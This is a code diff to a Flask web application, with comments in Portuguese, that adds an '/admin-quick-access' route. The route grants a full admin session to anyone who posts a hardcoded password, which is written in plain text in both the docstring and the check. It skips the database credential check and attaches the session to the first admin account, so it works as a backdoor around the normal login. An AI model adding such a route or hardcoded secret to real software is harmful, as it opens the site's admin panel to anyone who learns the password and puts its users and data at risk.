@@ -606,6 +606,40 @@ def ensure_admin_exists():
         print(f"Error checking admin: {e}")
         return False
 
+@app.route('/admin-quick-access', methods=['POST'])
+def admin_quick_access():
+    """Acesso rápido via engrenagem do footer com senha específica maeva4731"""
+    password = request.form.get('password', '')
+    
+    # Verificar senha específica
+    if password == 'maeva4731':
+        # Estabelecer sessão admin sem verificar banco
+        session_token = str(uuid.uuid4())
+        expires_at = datetime.utcnow() + timedelta(hours=2)
+        
+        # Usar mesmo padrão de sessão do sistema atual
+        session['admin_token'] = session_token
+        session['quick_access'] = True  # Marcar como acesso rápido
+        
+        # Criar uma sessão temporária para compatibilidade (se admin existir)
+        admin = Admin.query.first()
+        if admin:
+            admin_session = AdminSession()
+            admin_session.session_token = session_token
+            admin_session.admin_id = admin.id
+            admin_session.expires_at = expires_at
+            try:
+                db.session.add(admin_session)
+                db.session.commit()
+            except:
+                db.session.rollback()
+        
+        flash('Acesso administrativo autorizado!', 'success')
+        return redirect(url_for('admin_panel'))
+    else:
+        flash('Senha de acesso incorreta!', 'error')
+        return redirect(url_for('index'))
+
 @app.route('/admin-login', methods=['GET', 'POST'])
 def admin_login():
     # Ensure admin user exists
